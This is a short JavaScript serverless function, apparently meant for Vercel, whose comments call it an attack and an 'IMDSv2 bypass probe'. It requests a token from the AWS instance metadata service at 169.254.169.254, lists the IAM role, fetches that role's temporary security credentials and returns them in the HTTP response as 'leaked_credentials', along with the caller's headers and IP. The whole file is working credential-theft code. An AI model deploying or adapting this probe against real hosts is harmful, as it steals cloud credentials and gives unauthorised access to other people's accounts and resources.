export default async function handler(request, response) {

    const serverData = {
        'Timestamp': new Date().toUTCString(),
        'RequestURL': request.url,
        'Source IP (Vercel)': request.headers['x-forwarded-for']?.split(',').shift() || 'N/A',
        'HTTP_Headers': request.headers,
    };

    // ========================================================================
    // --- ADVANCED IMDSv2 BYPASS PROBE ---
    // This is the primary attack now. We will try the full IMDSv2 flow.
    // ========================================================================
    serverData.IMDSv2_PROBE = { status: 'pending' };

    try {
        // STEP 1: Fetch the session token using a PUT request.
        const tokenResponse = await fetch('http://169.254.169.254/latest/api/token', {
            method: 'PUT',
            headers: {
                'X-aws-ec2-metadata-token-ttl-seconds': '21600', // Request a token valid for 6 hours
            },
            signal: AbortSignal.timeout(2000) // 2-second timeout
        });

        if (!tokenResponse.ok) {
            throw new Error(`Token request failed with status: ${tokenResponse.status}`);
        }
        
        const token = await tokenResponse.text();
        serverData.IMDSv2_PROBE.token_retrieved = true;

        // STEP 2: Use the token to fetch the IAM security credentials.
        const credsResponse = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
            method: 'GET',
            headers: {
                'X-aws-ec2-metadata-token': token, // Use the retrieved token
            },
            signal: AbortSignal.timeout(2000) // 2-second timeout
        });

        if (!credsResponse.ok) {
            throw new Error(`Credential request failed with status: ${credsResponse.status}`);
        }

        const iamRoleName = await credsResponse.text();
        serverData.IMDSv2_PROBE.status = 'SUCCESS - IAM Role Found!';
        serverData.IMDSv2_PROBE.iam_role_name = iamRoleName;

        // BONUS STEP 3: If we found a role, let's get the actual credentials.
        const finalCredsResponse = await fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${iamRoleName}`, {
            method: 'GET',
            headers: { 'X-aws-ec2-metadata-token': token },
            signal: AbortSignal.timeout(2000)
        });

        const finalCreds = await finalCredsResponse.json();
        serverData.IMDSv2_PROBE.leaked_credentials = finalCreds;


    } catch (error) {
        serverData.IMDSv2_PROBE.status = 'failed';
        serverData.IMDSv2_PROBE.error = error.message;
    }

    // Final response
    response.status(200).json(serverData);
}